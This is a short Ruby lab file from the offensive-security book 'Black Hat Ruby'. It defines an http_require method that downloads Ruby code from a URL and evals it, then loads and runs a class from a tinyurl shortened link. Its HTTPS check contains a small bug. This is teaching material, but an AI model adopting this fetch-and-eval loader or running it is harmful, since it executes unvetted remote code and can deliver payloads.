#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   require method can require remote files over HTTP
# Requirements:
#
module Kernel
  def http_require(uri, proxy_settings = nil)
    require 'open-uri'
    url = URI.parse(uri)
    if url.is_a?(URI::HTTP) || uri.is_a?(URI::HTTPS)
      lib = URI.open(url, proxy: proxy_settings).read
      eval(lib)
    end
  rescue Exception => e
    puts e.full_message
  end
end

http_require 'https://tinyurl.com/BHR-RemoteClass'

bhr = BHR::RemoteClass.new 
bhr.run 
